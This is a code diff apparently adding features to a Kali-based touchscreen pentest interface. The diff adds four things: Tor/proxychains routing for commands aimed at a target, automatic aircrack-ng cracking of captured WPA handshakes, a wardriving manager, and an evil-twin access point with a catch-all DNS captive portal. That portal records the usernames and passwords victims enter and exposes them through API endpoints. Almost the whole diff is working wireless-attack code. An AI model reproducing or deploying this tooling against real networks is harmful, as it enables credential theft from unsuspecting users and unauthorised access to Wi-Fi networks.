@@ -572,6 +572,17 @@ def find_tool(section, label):
     return None
 
 
+def _ensure_tor():
+    """Bring the tor service up if the route-through-Tor toggle is on."""
+    rc, _ = _ota_sh("systemctl is-active tor 2>/dev/null", 10)
+    if rc != 0:
+        _ota_sh("systemctl start tor", 20)
+
+
+def _proxychains_bin():
+    return shutil.which("proxychains4") or shutil.which("proxychains") or ""
+
+
 def build_cmd(params):
     section = sanitize(params.get("section", "util"))
     label = params.get("label", "")
@@ -596,6 +607,12 @@ def build_cmd(params):
         cmd = cmd.replace("{hashmode}", sanitize(hm or "0"))
     if needs_root:
         cmd = "sudo " + cmd
+    if params.get("tor") and params.get("target"):
+        pc = _proxychains_bin()
+        if not pc:
+            raise ValueError("Tor routing needs proxychains — tap Install (proxychains4)")
+        _ensure_tor()
+        cmd = ("sudo %s " % pc + cmd[len("sudo "):]) if needs_root else "%s %s" % (pc, cmd)
     return cmd
 
 
@@ -991,6 +1008,7 @@ class HandshakeManager:
         self.target = None
         self.base = None
         self.channel = None
+        self.autocrack_pid = None
 
     def running(self):
         return self.proc is not None and self.proc.poll() is None
@@ -1021,6 +1039,8 @@ class HandshakeManager:
         log = open(HS_DIR + "/hs.log", "wb")
         self.proc = subprocess.Popen(cmd, stdout=log, stderr=subprocess.STDOUT)
         self.iface = iface
+        self.autocrack_pid = None
+        threading.Thread(target=self._autocrack_watch, daemon=True).start()
         return True, os.path.basename(base)
 
     def stop(self, crack=True):
@@ -1034,15 +1054,113 @@ class HandshakeManager:
                 except OSError:
                     pass
             self.proc = None
-        if crack and HASHCAT and HASHCAT.poll() is None:
-            try:
-                HASHCAT.terminate()
-                HASHCAT.wait(5)
-            except (subprocess.TimeoutExpired, OSError):
+        if crack:
+            if HASHCAT and HASHCAT.poll() is None:
                 try:
-                    HASHCAT.kill()
+                    HASHCAT.terminate()
+                    HASHCAT.wait(5)
+                except (subprocess.TimeoutExpired, OSError):
+                    try:
+                        HASHCAT.kill()
+                    except OSError:
+                        pass
+            if self.autocrack_pid and self.autocrack_pid.poll() is None:
+                try:
+                    self.autocrack_pid.terminate()
+                    self.autocrack_pid.wait(5)
+                except (subprocess.TimeoutExpired, OSError):
+                    try:
+                        self.autocrack_pid.kill()
+                    except OSError:
+                        pass
+
+    def _autocrack_watch(self):
+        """While capturing, watch the pcap for the first handshake/PMKID and,
+        when it lands, convert + auto-crack it with aircrack-ng (jammer-free
+        grace: we stop prompting the client, aircrack just waits for the
+        material already collected)."""
+        seen = set()
+        last_size = -1
+        last_hs = 0
+        while self.running():
+            try:
+                caps = sorted(glob.glob(self.base + "*.cap"),
+                              key=os.path.getmtime, reverse=True)
+                cap = caps[0] if caps else None
+                if not cap:
+                    time.sleep(3)
+                    continue
+                size = os.path.getsize(cap)
+                if size == last_size:
+                    time.sleep(3)
+                    continue
+                last_size = size
+                hash_out = HS_HASHES + "/" + os.path.basename(cap)[:-4] + ".22000"
+                try:
+                    r = subprocess.run(
+                        ["hcxpcapngtool", "-o", hash_out, cap],
+                        capture_output=True, text=True, timeout=60)
+                except (OSError, subprocess.TimeoutExpired):
+                    continue
+                txt = (r.stdout or "") + "\n" + (r.stderr or "")
+                n_hs = txt.count("4-WAY HANDSHAKE") + txt.count("Fourway") \
+                    + txt.count("PMKID") + txt.count("PMKID-EAPOL")
+                if n_hs <= last_hs:
+                    continue
+                last_hs = n_hs
+                if not os.path.isfile(hash_out) or os.path.getsize(hash_out) == 0:
+                    continue
+                if self.cracked(os.path.basename(cap)[:-4]):
+                    break
+                if HASHCAT is not None and HASHCAT.poll() is None:
+                    continue
+                if self.autocrack_pid and self.autocrack_pid.poll() is None:
+                    continue
+                if not os.path.isfile(WORDLIST):
+                    continue
+                try:
+                    os.makedirs(HS_POTS, exist_ok=True)
                 except OSError:
                     pass
+                pot = HS_POTS + "/" + os.path.basename(cap)[:-4] + ".aircrack"
+                self.autocrack_pid = subprocess.Popen(
+                    ["sudo", "-n", "aircrack-ng", "-w", WORDLIST,
+                     "-b", self.target, cap],
+                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+                threading.Thread(
+                    target=self._autocrack_collect,
+                    args=(self.autocrack_pid, pot, cap), daemon=True).start()
+            except Exception:
+                pass
+            time.sleep(3)
+
+    def _autocrack_collect(self, proc, pot, cap):
+        """Sweep aircrack-ng output for the passphrase and persist it."""
+        buf = ""
+        try:
+            for line in proc.stdout:
+                buf += line
+                if "KEY FOUND" in line:
+                    parts = line.split("[", 1)
+                    pw = parts[1].split("]", 1)[0].strip() if len(parts) > 1 else ""
+                    if pw:
+                        try:
+                            with open(pot, "w") as f:
+                                f.write(self.target + ":" + pw + "\n")
+                        except OSError:
+                            pass
+                        break
+        except Exception:
+            pass
+        try:
+            proc.wait()
+        except OSError:
+            pass
+
+    def autocrack_state(self):
+        if self.autocrack_pid is not None and self.autocrack_pid.poll() is None:
+            return "running"
+        return None
 
     def captures(self):
         out = []
@@ -1077,6 +1195,15 @@ class HandshakeManager:
         if os.path.isfile(pf):
             try:
                 with open(pf, "r") as f:
+                    line = f.read().strip()
+                if ":" in line:
+                    return line.split(":", 2)[-1]
+            except OSError:
+                pass
+        af = HS_POTS + "/" + base + ".aircrack"
+        if os.path.isfile(af):
+            try:
+                with open(af, "r") as f:
                     line = f.read().strip()
                 if ":" in line:
                     return line.split(":", 2)[-1]
@@ -1152,12 +1279,418 @@ def run_feed():
 threading.Thread(target=run_feed, daemon=True).start()
 
 
+# ---------------- Wardriving (phone-GPS headless drive) ----------------
+WARDIRVE_HEADLESS = os.path.join(
+    os.path.dirname(os.path.abspath(__file__)), "..", "wardrive", "headless.py")
+WARDIRVE_PORT = int(os.environ.get("WARDRIVER_PORT", "8888"))
+
+
+def lan_address(host_hint=""):
+    """Best guess at the address a phone on the same LAN can reach us on."""
+    hint = (host_hint or "").strip().rstrip("0123456789:.")
+    if hint and re.match(r"\d+\.\d+\.\d+\.\d+", hint):
+        return hint
+    try:
+        addr = socket.gethostbyname(socket.gethostname())
+        if addr and not addr.startswith("127."):
+            return addr
+    except OSError:
+        pass
+    try:
+        out = subprocess.run(["ip", "-4", "-o", "addr", "show"], capture_output=True,
+                             text=True, timeout=5).stdout or ""
+        best = ""
+        for line in out.splitlines():
+            m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", line)
+            if not m:
+                continue
+            a = m.group(1)
+            if a.startswith("127."):
+                continue
+            if a.startswith("172.20.") or a.startswith("172.") or a.startswith("10."):
+                return a
+            best = best or a
+        if best:
+            return best
+    except (OSError, subprocess.TimeoutExpired):
+        pass
+    return "10.0.0.1"
+
+
+def _wireless_ifaces():
+    out = []
+    try:
+        for entry in sorted(os.listdir("/sys/class/net")):
+            if os.path.isdir("/sys/class/net/%s/wireless" % entry) \
+                    and not re.match(r"p2p", entry, re.I):
+                out.append(entry)
+    except OSError:
+        pass
+    return out
+
+
+class WardriveManager:
+    """Manages the headless wardriver child process: scan loop + HTTPS phone-GPS
+    page (QR) on port WARDIRVE_PORT; streams JSON status lines to the UI."""
+
+    MAX_TAIL = 120
+
+    def __init__(self):
+        self.proc = None
+        self.queue = []
+        self.lock = threading.Lock()
+        self.last = {}
+        self.boot = {}
+        self.iface = None
+        self.port = WARDIRVE_PORT
+
+    def running(self):
+        return self.proc is not None and self.proc.poll() is None
+
+    def start(self, iface=None, ble=False):
+        if self.running():
+            return False, "wardriving is already running"
+        if Handler._apt_busy():
+            return False, "apt is busy"
+        try:
+            os.makedirs(os.path.expanduser("~/.wardriver/scans"), exist_ok=True)
+        except OSError:
+            pass
+        cmd = ["sudo", "-n", "python3", WARDIRVE_HEADLESS,
+               "--iface", iface, "--interval", "8", "--home", os.path.expanduser("~"),
+               "--port", str(self.port)]
+        if ble:
+            cmd.append("--ble")
+        try:
+            self.proc = subprocess.Popen(
+                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, bufsize=1, env=dict(os.environ, PYTHONUNBUFFERED="1"))
+        except OSError as e:
+            self.proc = None
+            return False, "could not start wardriver: %s" % e
+        self.iface = iface or "auto"
+        with self.lock:
+            self.queue = []
+            self.last = {}
+            self.boot = {}
+        threading.Thread(target=self._reader, daemon=True).start()
+        return True, "wardriving started on %s" % iface
+
+    def _reader(self):
+        while self.running():
+            line = self.proc.stdout.readline()
+            if not line:
+                break
+            line = line.rstrip()
+            if not line:
+                continue
+            try:
+                evt = json.loads(line)
+                if isinstance(evt, dict):
+                    with self.lock:
+                        self.last = evt
+                        if evt.get("event") == "boot":
+                            self.boot = evt
+            except (ValueError, TypeError):
+                evt = {"event": "raw", "msg": line[:300]}
+            with self.lock:
+                self.queue.append(evt)
+                if len(self.queue) > self.MAX_TAIL:
+                    del self.queue[: len(self.queue) - self.MAX_TAIL]
+
+    def stop(self):
+        if self.proc is not None:
+            try:
+                self.proc.terminate()
+                self.proc.wait(8)
+            except (subprocess.TimeoutExpired, OSError):
+                try:
+                    self.proc.kill()
+                except OSError:
+                    pass
+            self.proc = None
+
+    def status(self, host_hint=""):
+        with self.lock:
+            last = dict(self.last)
+            boot = dict(self.boot)
+            tail = list(self.queue)
+        running = self.running()
+        url = ""
+        if running and boot.get("gps_url"):
+            host = lan_address(host_hint)
+            url = boot["gps_url"].replace("<host>", host)
+        return {
+            "running": running,
+            "iface": self.iface,
+            "port": self.port,
+            "last": last,
+            "url": url,
+            "tail": tail[-40:],
+            "scans_dir": os.path.join(os.path.expanduser("~"), ".wardriver", "scans"),
+            "ifaces": _wireless_ifaces(),
+        }
+
+    def qr_png_data(self, url):
+        """Render a QR PNG data: URL for the phone page, or None."""
+        try:
+            import base64
+            import io
+            import qrcode
+        except ImportError:
+            return None
+        try:
+            img = qrcode.make(url)
+            buf = io.BytesIO()
+            img.save(buf, format="png")
+            return "data:image/png;base64," + base64.b64encode(buf.getvalue()).decode()
+        except Exception:
+            return None
+
+
+WARDIRVE = WardriveManager()
+
+
+# ---------------- Rogue AP + captive portal ----------------
+ROGUE_DIR = "/tmp/rogue"
+ROGUE_PORTAL = os.path.join(
+    os.path.dirname(os.path.abspath(__file__)), "..", "rogue", "portal.py")
+ROGUE_IP = "10.66.66.1"
+ROGUE_RANGE = "10.66.66.20,10.66.66.200,255.255.255.0,12h"
+ROGUE_CREDS = ROGUE_DIR + "/creds.csv"
+ROGUE_LEASES = ROGUE_DIR + "/dnsmasq.leases"
+
+
+class RogueManager:
+    """Evil-twin AP on a dedicated NIC (hostapd) + captive portal (dnsmasq
+    resolves everything to us, a root child on :80 serves the login page and
+    logs whatever the victim submits)."""
+
+    def __init__(self):
+        self.hostapd = None      # pidfile proc ref (hostapd -B)
+        self.dnsmasq = None
+        self.portal = None
+        self.iface = None
+        self.ssid = ""
+        self.channel = None
+
+    def running(self):
+        if self.hostapd is not None and self.hostapd.poll() is None:
+            return True
+        return subprocess.run(
+            ["pgrep", "-f", "hostapd.*" + re.escape(ROGUE_DIR)],
+            stdout=subprocess.DEVNULL).returncode == 0
+
+    def have_hostapd(self):
+        return bool(shutil.which("hostapd") and shutil.which("dnsmasq"))
+
+    @staticmethod
+    def _nohup_sudo(cmd, log):
+        return subprocess.Popen(
+            ["sudo", "-n"] + cmd, stdout=open(log, "a"), stderr=subprocess.STDOUT)
+
+    def start(self, iface, ssid, channel, psk=None):
+        if self.running():
+            return False, "a rogue AP is already running"
+        if not self.have_hostapd():
+            return False, "hostapd/dnsmasq missing (apt install hostapd dnsmasq)"
+        if not re.fullmatch(r"[\x20-\x7e]{1,32}", str(ssid)):
+            return False, "bad SSID (1-32 printable chars)"
+        try:
+            channel = int(channel)
+            if not 1 <= channel <= 14:
+                raise ValueError
+        except (TypeError, ValueError):
+            return False, "bad channel (1-14)"
+        if psk is not None:
+            psk = str(psk)
+            if not 8 <= len(psk) <= 63:
+                return False, "WPA2 passphrase must be 8-63 chars"
+        r = subprocess.run(["sudo", "-n", "iw", "dev", iface, "info"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        if r.returncode != 0:
+            return False, "no such wireless interface: %s" % iface
+
+        # Don't fight any active wardrive session on the same NIC.
+        if WARDIRVE.running():
+            WARDIRVE.stop()
+
+        try:
+            os.makedirs(ROGUE_DIR, exist_ok=True)
+        except OSError:
+            pass
+        # The root portal / earlier runs may have left a root-owned dir; log
+        # handles below open from the kali backend, so take it back.
+        subprocess.run(["sudo", "-n", "chown", "-R", os.environ.get("USER", "kali") + ":",
+                        ROGUE_DIR], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        self._kill_all()
+
+        for a in (["ip", "link", "set", iface, "down"],
+                  ["iw", "dev", iface, "set", "type", "ap"],
+                  ["ip", "link", "set", iface, "up"]):
+            subprocess.run(["sudo", "-n"] + a, stdout=subprocess.DEVNULL,
+                           stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "-n", "ip", "addr", "flush", "dev", iface],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "-n", "ip", "addr", "add", ROGUE_IP + "/24",
+                        "dev", iface], stdout=subprocess.DEVNULL,
+                       stderr=subprocess.DEVNULL)
+
+        hostapd_txt = [
+            "interface=%s" % iface,
+            "driver=nl80211",
+            "ssid=%s" % ssid,
+            "hw_mode=g",
+            "channel=%s" % channel,
+            "ieee80211n=1",
+            "logger_stdout=-1",
+            "logger_syslog=-1",
+        ]
+        if psk:
+            hostapd_txt += ["wpa=2", "wpa_passphrase=%s" % psk,
+                            "wpa_key_mgmt=WPA-PSK", "rsn_pairwise=CCMP",
+                            "ignore_broadcast_ssid=0"]
+        with open(ROGUE_DIR + "/hostapd.conf", "w") as f:
+            f.write("\n".join(hostapd_txt) + "\n")
+
+        dnsmasq_txt = [
+            "interface=%s" % iface,
+            "bind-interfaces",
+            "dhcp-range=%s" % ROGUE_RANGE,
+            "dhcp-option=3,%s" % ROGUE_IP,
+            "dhcp-option=6,%s" % ROGUE_IP,
+            "address=/#/%s" % ROGUE_IP,
+            "no-resolv",
+            "dhcp-leasefile=%s" % ROGUE_LEASES,
+            "log-facility=%s/dnsmasq.log" % ROGUE_DIR,
+        ]
+        with open(ROGUE_DIR + "/dnsmasq.conf", "w") as f:
+            f.write("\n".join(dnsmasq_txt) + "\n")
+
+        self.hostapd = self._nohup_sudo(
+            ["hostapd", "-P", ROGUE_DIR + "/hostapd.pid", "-B",
+             ROGUE_DIR + "/hostapd.conf"], ROGUE_DIR + "/hostapd.log")
+        self.dnsmasq = self._nohup_sudo(
+            ["dnsmasq", "-C", ROGUE_DIR + "/dnsmasq.conf",
+             "--pid-file=" + ROGUE_DIR + "/dnsmasq.pid"],
+            ROGUE_DIR + "/dnsmasq.log")
+        self.portal = self._nohup_sudo(
+            ["python3", ROGUE_PORTAL], ROGUE_DIR + "/portal.log")
+
+        self.iface = iface
+        self.ssid = ssid
+        self.channel = channel
+
+        # Verify the AP actually came up; hostapd exits silently if the NIC is
+        # married to something else. Tear down and report the log on failure.
+        time.sleep(1.2)
+        up = subprocess.run(
+            ["pgrep", "-f", "hostapd.*" + re.escape(ROGUE_DIR)],
+            stdout=subprocess.DEVNULL).returncode == 0
+        if not up:
+            self.stop()
+            log = ""
+            try:
+                with open(ROGUE_DIR + "/hostapd.log") as f:
+                    log = f.read()[-500:]
+            except OSError:
+                pass
+            return False, "hostapd failed to start — " + (log or "(no log)").strip()[:200]
+        return True, "rogue AP '%s' on %s ch %s" % (ssid, iface, channel)
+
+    def _kill_all(self):
+        for pidfile in ("/hostapd.pid", "/dnsmasq.pid"):
+            pf = ROGUE_DIR + pidfile
+            if os.path.isfile(pf):
+                try:
+                    pid = int(open(pf).read().strip())
+                    os.kill(pid, signal.SIGTERM)
+                except (OSError, ValueError):
+                    pass
+        for name in ("dnsmasq", "hostapd"):
+            subprocess.run(["sudo", "-n", "pkill", "-x", name],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        # `[r]` bracket keeps the pattern from matching this process's own
+        # command line the way a plain "-f rogue/portal.py" would.
+        subprocess.run(["sudo", "-n", "pkill", "-f", "[r]ogue/portal.py"],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        for p in (self.dnsmasq, self.portal, self.hostapd):
+            if p is not None:
+                try:
+                    p.terminate()
+                except OSError:
+                    pass
+        # give the listeners a moment to release :80 / the AP nic
+        time.sleep(0.8)
+        self.dnsmasq = None
+        self.portal = None
+        self.hostapd = None
+
+    def stop(self):
+        iface = self.iface
+        self._kill_all()
+        if iface:
+            for a in (["ip", "link", "set", iface, "down"],
+                      ["iw", "dev", iface, "set", "type", "managed"],
+                      ["ip", "link", "set", iface, "up"]):
+                subprocess.run(["sudo", "-n"] + a, stdout=subprocess.DEVNULL,
+                               stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "-n", "ip", "addr", "flush", "dev", iface],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            # Let NetworkManager reclaim the card for normal use.
+            subprocess.run(["sudo", "-n", "nmcli", "dev", "set", iface, "managed", "yes"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    def clients(self):
+        leases = []
+        if os.path.isfile(ROGUE_LEASES):
+            try:
+                with open(ROGUE_LEASES) as f:
+                    for ln in f.read().splitlines():
+                        parts = ln.split()
+                        if len(parts) >= 4:
+                            leases.append({"mac": parts[1], "ip": parts[2],
+                                           "host": parts[3]})
+            except OSError:
+                pass
+        return leases
+
+    def creds(self):
+        out = []
+        if os.path.isfile(ROGUE_CREDS):
+            try:
+                with open(ROGUE_CREDS, newline="") as f:
+                    rows = list(csv.reader(f))
+                for r in rows[1:][-12:]:
+                    if len(r) >= 5:
+                        out.append({"time": r[0], "ip": r[1], "ssid": r[2],
+                                    "user": r[3], "pw": r[4]})
+            except OSError:
+                pass
+        return out
+
+    def status(self):
+        return {
+            "running": self.running(),
+            "iface": self.iface,
+            "ssid": self.ssid,
+            "channel": self.channel,
+            "hostapd": bool(shutil.which("hostapd")),
+            "clients": self.clients(),
+            "creds": self.creds(),
+            "ifaces": _wireless_ifaces(),
+        }
+
+
+ROGUE = RogueManager()
+
+
 # ---------------- OTA update ----------------
 OTA_REPO = "https://github.com/darkLabz001/kali-touch-ui.git"
 OTA_BRANCH = "main"
 OTA_DIR = "/opt/kali-touch-ui"
 OTA_LOG = "/tmp/ota.log"
-APP_VERSION = "1.2.0"
+APP_VERSION = "1.3.0"
 _ota_busy = False
 _ota_lock = threading.Lock()
 
@@ -1430,6 +1963,7 @@ class Handler(BaseHTTPRequestHandler):
                 "channel": HS.channel,
                 "captures": len(glob.glob(HS_DIR + "/*.cap")),
                 "cracking": (HASHCAT is not None and HASHCAT.poll() is None),
+                "autocrack": HS.autocrack_state(),
             }).encode())
         elif path == "/api/hs/captures":
             self._send(200, json.dumps({"captures": HS.captures()}).encode())
@@ -1447,6 +1981,15 @@ class Handler(BaseHTTPRequestHandler):
                 tail = ""
             busy = subprocess.run(["pgrep", "-x", "apt-get"], stdout=subprocess.DEVNULL).returncode == 0
             self._send(200, json.dumps({"busy": busy, "log": tail}).encode())
+        elif path == "/api/wardrive/status":
+            st = WARDIRVE.status(self.headers.get("Host", ""))
+            if not st["running"]:
+                st["qr"] = None
+            else:
+                st["qr"] = WARDIRVE.qr_png_data(st["url"])
+            self._send(200, json.dumps(st).encode())
+        elif path == "/api/rogue/status":
+            self._send(200, json.dumps(ROGUE.status()).encode())
         elif path == "/sse/term":
             self.handle_sse_term()
             return
@@ -1558,6 +2101,23 @@ class Handler(BaseHTTPRequestHandler):
             self._send(200, json.dumps({"ok": True}).encode())
         elif path == "/api/term/stop":
             TERM.stop()
+            self._send(200, json.dumps({"ok": True}).encode())
+        elif path == "/api/wardrive/start":
+            ok, msg = WARDIRVE.start(
+                (body.get("iface") or "").strip() or None, bool(body.get("ble")))
+            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
+        elif path == "/api/wardrive/stop":
+            WARDIRVE.stop()
+            self._send(200, json.dumps({"ok": True}).encode())
+        elif path == "/api/rogue/start":
+            ok, msg = ROGUE.start(
+                (body.get("iface") or "").strip(),
+                (body.get("ssid") or "Free-WiFi").strip(),
+                body.get("channel") or 6,
+                body.get("psk") or None)
+            self._send(200 if ok else 400, json.dumps({"ok": ok, "msg": msg}).encode())
+        elif path == "/api/rogue/stop":
+            ROGUE.stop()
             self._send(200, json.dumps({"ok": True}).encode())
         else:
             self._send(404, b"nf")
